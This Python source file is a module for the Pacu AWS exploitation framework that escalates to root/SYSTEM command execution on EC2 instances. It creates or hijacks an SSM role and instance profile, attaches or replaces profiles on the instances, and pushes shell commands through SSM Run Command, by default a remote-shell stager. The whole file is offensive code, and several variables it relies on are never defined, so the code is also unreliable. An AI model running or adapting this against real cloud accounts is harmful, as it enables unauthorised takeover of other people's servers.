#!/usr/bin/env python3
import boto3
import argparse
import os
import re
import time
from botocore.exceptions import ClientError

module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'sysman_ec2_rce',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Tries to execute code as root/SYSTEM on EC2 instances.',

    # Full description about what the module does and how it works
    'description': 'This module tries to execute arbitrary code on EC2 instances as root/SYSTEM using EC2 Systems Manager. To do so, it will first try to enumerate EC2 instances that are running operating systems that have the Systems Manager agent installed by default. Then, it will attempt to find the Systems Manager IAM instance profile, or try to create it if it can\'t find it. If successful, it will try to attach it to the instances enumerated earlier. Then it will use EC2 Run Command to execute arbitrary code on the EC2 instances as either root (Linux) or SYSTEM (Windows). By default, this module will execute a PacuProxy stager on the host to give you remote shell access, as well as a PacuProxy agent to route commands through.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['EC2'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_ec2'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--target-os', '--all-instances', '--replace', '--ip-name', '--role-name'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--target-os', required=False, default='All', help='This argument is what operating systems to target. Valid options are: Windows, Linux, or All. The default is All')
parser.add_argument('--all-instances', required=False, default=False, action='store_true', help='Skip vulnerable operating system check and just target every instance')
parser.add_argument('--replace', required=False, default=False, action='store_true', help='For EC2 instances that already have an instance profile attached to them, this argument will replace those with the Systems Manager instance profile. WARNING: This can cause bad things to happen! You never know what negative side effects this may have on a server without further inspection, because you do not know what permissions you are removing/replacing that the instance already had')
parser.add_argument('--ip-name', required=False, default=None, help='The name of an existing instance profile with an "EC2 Role for Simple Systems Manager" attached to it. This will skip the automatic role/instance profile enumeration and the searching for a Systems Manager role/instance profile. Note: This argument takes priority over --role-name, so if both arguments are passed in, --role-name will be discarded')
parser.add_argument('--role-name', required=False, default=None, help='The name of an existing "EC2 Role for Simple Systems Manager". If this argument is provided and --ip-name is not, this will skip the automatic role enumeration and the searching for a Systems Manager role and go straight to instance profile enumeration/searching')


def help():
    return [module_info, parser.format_help()]


def main(args, pacu_main):
    session = pacu_main.get_active_session()
    proxy_settings = pacu_main.get_proxy_settings()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    get_regions = pacu_main.get_regions
    ######

    # Make sure args.target_os equals one of All, Windows, or Linux
    if not (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows' or args.target_os.lower() == 'linux'):
        print('Invalid option specified for the --target-os argument. Valid options include: All, Windows, or Linux. If --target-os is not specified, the default is All.')
        return

    if fetch_data(['EC2', 'Instances'], 'enum_ec2', '--instances') is False:
        print('Pre-req module not run successfully. Exiting...')
        return
    instances = session.EC2['Instances']

    regions = get_regions('EC2')

    targeted_instances = []
    ssm_instance_profile_name = ''
    ssm_role_name = ''

    if args.all_instances is True:
        # DryRun describe_images (don't need to DryRun this if args.all_instances is False)
        try:
            client = boto3.client(
                'ec2',
                region_name=regions[0],
                aws_access_key_id=session.access_key_id,
                aws_secret_access_key=session.secret_access_key,
                aws_session_token=session.session_token,
                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
            )
            dryrun = client.describe_images(
                DryRun=True
            )
        except ClientError as error:
            if not str(error).find('UnauthorizedOperation') == -1:
                print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')

    
        os_with_default_ssm_agent = [
            '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
            '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
            '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*',
            #'Windows Server 2003-2012 R2 released after November 2016'
        ]

        # Begin enumeration of vulnerable images
        vuln_images = []
        for region in regions:
            image_ids = []
            print('Starting region {}...\n'.format(region))
            client = boto3.client(
                'ec2',
                region_name=region,
                aws_access_key_id=session.access_key_id,
                aws_secret_access_key=session.secret_access_key,
                aws_session_token=session.session_token,
                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
            )

            for instance in instances:
                if instance['Region'] == region:
                    image_ids.append(instance['ImageId'])

            # Describe all images being used in the environment
            if image_ids == []:
                print('  No images found.\n')
            else:
                images = client.describe_images(
                    ImageIds=list(set(image_ids))
                )['Images']

                # Iterate images and determine if they are possibly one of the operating systems with SSM agent installed by default
                count = 0
                for image in images:
                    os_details = '{} {} {}'.format(image['Description'], image['ImageLocation'], image['Name'])
                    for vuln_os in os_with_default_ssm_agent:
                        result = re.match(r'{}'.format(vuln_os), os_details)
                        if result is not None:
                            count += 1
                            vuln_images.append(image['ImageId'])
                            break
                print('  {} vulnerable images found.\n'.format(count))
        print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
    
    # Begin Systems Manager role finder/creator
    client = boto3.client(
        'iam',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    ssm_policy = client.get_policy(
        PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
    )['Policy']

    if ssm_policy['AttachmentCount'] > 0:
        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
            print('Pre-req module not run successfully. Exiting...\n')
            return
        roles = session.IAM['Roles']

        # For each role that exists in the account
        for role in roles:
            # For each AssumeRole statement
            for statement in role['AssumeRolePolicyDocument']['Statement']:
                # Statement->Principal could be a liist or a dict
                if type(statement['Principal']) is list:
                    # For each item in the list, check if ec2.amazonaws.com is in it
                    for principal in statement['Principal']:
                        if 'ec2.amazonaws.com' in principal:
                            attached_policies = client.list_attached_role_policies(
                                RoleName=role['RoleName'],
                                PathPrefix='/service-role/'
                            )['AttachedPolicies']
                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                            for policy in attached_policies:
                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                    ssm_role_name = role['RoleName']
                                    break
                            if not ssm_role_name == '':
                                break
                    if not ssm_role_name == '':
                        break
                elif type(statement['Principal']) is dict:
                    # For each key in the dict, check if it equal ec2.amazonaws.com
                    for key in statement['Principal']:
                        if statement['Principal'][key] == 'ec2.amazonaws.com':
                            print(role['RoleName'])
                            attached_policies = client.list_attached_role_policies(
                                RoleName=role['RoleName']
                            )['AttachedPolicies']
                            print(attached_policies)
                            # It is an EC2 role, now figure out if it is an SSM EC2 role by checking for the SSM policy being attached
                            for policy in attached_policies:
                                print(policy['PolicyArn'])
                                print(policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM')
                                if policy['PolicyArn'] == 'arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM':
                                    ssm_role_name = role['RoleName']
                                    break
                            if not ssm_role_name == '':
                                break
                    if not ssm_role_name == '':
                        break
            if not ssm_role_name == '':
                break
    if ssm_role_name == '':
        print('Did not find valid EC2 SystemsManager service role (which means there is no instance profile either). Trying to create one now...\n')
        try:
            # Create the SSM role
            create_response = client.create_role(
                RoleName='SSM',
                AssumeRolePolicyDocument='{"Version": "2012-10-17", "Statement": [{"Sid": "", "Effect": "Allow", "Principal": {"Service": "ec2.amazonaws.com"}, "Action": "sts:AssumeRole"}]}'
            )['Role']

            ssm_role_name = create_response['RoleName']

            # Attach the SSM policy to the role just created
            attach_response = client.attach_role_policy(
                RoleName=ssm_role_name,
                PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
            )
            print('  Successfully created the required role: {}\n'.format(create_response['Arn']))
        except Exception as error:
            print('  Unable to create the required role: {}\n'.format(str(error)))
            return
    else:
        print('Found valid SystemsManager service role: {}. Checking if it is associated with an instance profile...\n'.format(ssm_role_name))

        # Find instance profile belonging to that role
        response = client.list_instance_profiles_for_role(
            RoleName=ssm_role_name,
            MaxItems=1
        )

        if len(response['InstanceProfiles']) > 0:
            ssm_instance_profile_name = response['InstanceProfiles'][0]['InstanceProfileName']
            print('Found valid instance profile: {}.\n'.format(ssm_instance_profile_name))
        # Else, leave ssm_instance_profile_name == ''

    # If no instance profile yet, create one with the role we have
    if instance_profile == '':
        # There is no instance profile yet
        try:
            # Create a new instance profile
            ssm_instance_profile_name = client.create_instance_profile(
                InstanceProfileName='SSM'
            )['InstanceProfile']['InstanceProfileName']

            # Attach our role to the new instance profile
            client.add_role_to_instance_profile(
                InstanceProfileName=ssm_instance_profile_name,
                RoleName=ssm_role_name
            )
        except Exception as error:
            print('  Unable to create an instance profile: {}\n'.format(str(error)))
            return

    # Start attaching the instance profile to the vulnerable instances
    client = boto3.client(
        'ec2',
        aws_access_key_id=session.access_key_id,
        aws_secret_access_key=session.secret_access_key,
        aws_session_token=session.session_token,
        config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
    )

    print('Starting to attach the instance profile to vulnerable EC2 instances...\n')
    # args.replace is the static argument passed in from the user, but the
    # variable replace can be modified in cases where the call is failing,
    # likely due to permissions, but I give the user a choice below in the
    # error handling section
    replace = args.replace
    for region in regions:
        # instances_to_replace will be filled up as each instance is checked for
        # each region. The describe_iam_instance_profile_associations API call
        # supports multiple instance IDs as filters, so by collecting a list and
        # then running the API call once for all IDs, it minimizes the amount of
        # total API calls made.
        instances_to_replace = []
        for instance in instances:
            if instance['Region'] == region:
                if args.all_instances is True or instance['ImageId'] in vuln_images:
                    if 'IamInstanceProfile' in instance:
                        # The instance already has an instance profile attached, skip it if
                        # args.replace is not True, otherwise add it to instances_to_replace
                        if args.replace is True and replace is True:
                            instances_to_replace.append(instance['InstanceId'])
                        else:
                            print('  Instance ID {} already has an instance profile attached to it, skipping...'.format(instance['InstanceId']))
                            pass
                    else:
                        # There is no instance profile attached yet, do it now
                        response = client.associate_iam_instance_profile(
                            InstanceId=instance['InstanceId'],
                            IamInstanceProfile={
                                'Name': ssm_instance_profile_name
                            }
                        )
                        targeted_instances.append(instance['InstanceId'])
                        print('  Instance profile attached to instance ID {}.'.format(instance['InstanceId']))
        if len(instances_to_replace) > 0 and replace is True:
            # There are instances that need their role replaced, so discover association IDs to make that possible
            all_associations = []
            response = client.describe_iam_instance_profile_associations(
                Filters=[
                    {
                        'Name': 'instance-id',
                        'Values': instances_to_replace
                    }
                ]
            )
            all_associations.extend(response['IamInstanceProfileAssociations'])
            while 'NextToken' in response:
                response = client.describe_iam_instance_profile_associations(
                    NextToken=response['NextToken'],
                    Filters=[
                        {
                            'Name': 'instance-id',
                            'Values': instances_to_replace
                        }
                    ]
                )
                all_associations.extend(response['IamInstanceProfileAssociations'])

            # Start replacing the instance profiles
            for instance_id in instances_to_replace:
                for association in all_associations:
                    if instance_id == association['InstanceId']:
                        association_id = association['AssociationId']
                        break
                try:
                    client.replace_iam_instance_profile_association(
                        AssociationId=association_id,
                        IamInstanceProfile={
                            'Name': ssm_instance_profile_name
                        }    
                    )
                    targeted_instances.append(instance_id)
                    print('  Instance profile replaced for instance ID {}.'.format(instance_id))
                except Exception as error:
                    print('  Failed to run replace_iam_instance_profile_association on instance ID {}: {}\n'.format(instance_id, str(error)))
                    replace = input('Do you want to keep trying to replace instance profiles, or skip the rest based on the error shown? (y/n) ')
                    if replace == 'y':
                        replace = True
                    else:
                        replace = False
                        break
            
    print('  Done.\n')

    # Start polling SystemsManager/RunCommand to see if instances show up
    print('Waiting for targeted instances to appear in Systems Manager... This will be checked every 30 seconds for 10 minutes (or until all targeted instances have shown up, whichever is first). After each check, the shell command will be executed against all new instances that showed up since the last check. If an instance has not shown up after 10 minutes, it most likely means that it does not have the SSM Agent installed and is not vulnerable to this attack.\n')

    # Check 20 times in 30 second intervals (10 minutes) or until all targeted instances have been attacked
    discovered_instances = []
    attacked_instances = []
    ignored_instances = []
    for i in range(1, 21):
        this_check_attacked_instances = []
        for region in regions:
            # Accumulate a list of instances to attack to minimize the amount of API calls being made
            windows_instances_to_attack = []
            linux_instances_to_attack = []
            client = boto3.client(
                'ssm',
                region_name=region,
                aws_access_key_id=session.access_key_id,
                aws_secret_access_key=session.secret_access_key,
                aws_session_token=session.session_token,
                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
            )

            # Enumerate instances that appear available to Systems Manager
            response = client.describe_instance_information()
            for instance in response['InstanceInformationList']:
                discovered_instances.append([instance['InstanceId'], instance['PlatformType']])
            while 'NextToken' in response:
                response = client.describe_instance_information(
                    NextToken=response['NextToken']
                )
                for instance in response['InstanceInformationList']:
                    discovered_instances.append([instance['InstanceId'], instance['PlatformType']])

            for instance in discovered_instances:
                # Has this instance been attacked yet?
                if instance[0] not in attacked_instances and instance[0] not in ignored_instances:
                    if args.target_os.lower() == 'all' or instance[1].lower() == args.target_os.lower():
                        # Is this instance eligible for an attack, but was not targeted?
                        if instance[0] not in targeted_instances:
                            action = input('  Instance ID {} (Platform: {}) was not found in the list of targeted instances, but it might be possible to attack it, do you want to attack this instance (a) or ignore it (i)? (a/i) '.format(instance[0], instance[1]))
                            if action == 'i':
                                ignored_instances.append(instance[0])
                                continue
                        if instance[1].lower() == 'windows':
                            windows_instances_to_attack.append(instance[0])
                        elif instance[1].lower() == 'linux':
                            linux_instances_to_attack.append(instance[0])
                        else:
                            print('  Unknown operating system for instance ID {}: {}. Not attacking it...\n'.format(instance[0], instance[1]))

            # Collectively attack all new instances that showed up in the last check for this region
           
            # Windows
            if args.target_os.lower() == 'all' or instance[1].lower() == 'windows':
                response = client.send_command(
                    InstanceIds=windows_instances_to_attack,
                    DocumentName='AWS-RunPowerShellScript',
                    MaxErrors='100%',
                    Parameters={
                        'commands': [shell_command if not shell_command == '' else pp_windows_stager]
                    }
                )
                this_check_attacked_instances.extend(windows_instances_to_attack)
                attacked_instances.extend(windows_instances_to_attack)
            
            # Linux
            if args.target_os.lower() == 'all' or instance[1].lower() == 'linux':
                response = client.send_command(
                    InstanceIds=linux_instances_to_attack,
                    DocumentName='AWS-RunShellScript',
                    MaxErrors='100%',
                    Parameters={
                        'commands': [shell_command if not shell_command == '' else pp_linux_stager]
                    }
                )
                this_check_attacked_instances.extend(linux_instances_to_attack)
                attacked_instances.extend(linux_instances_to_attack)
            
        print('{} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
        
        # Don't wait 30 seconds after the very last check
        if not i == 19:
            print('Waiting 30 seconds...')
            time.sleep(30)

    if i == 19:
        # We are here because it has been 10 minutes
        print('  It has been 10 minutes, if any target instances were not successfully attacked, then that most likely means they are not vulnerable to this attack (most likely the SSM Agent is not installed on the instances).\n')
        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))
    else:
        # We are here because all targeted instances have been attacked
        print('  All targeted instances showed up and were attacked.\n')
        print('  Successfully attacked the following instances: {}\n'.format(attacked_instances))

    print('{} completed.'.format(os.path.basename(__file__)))
    return
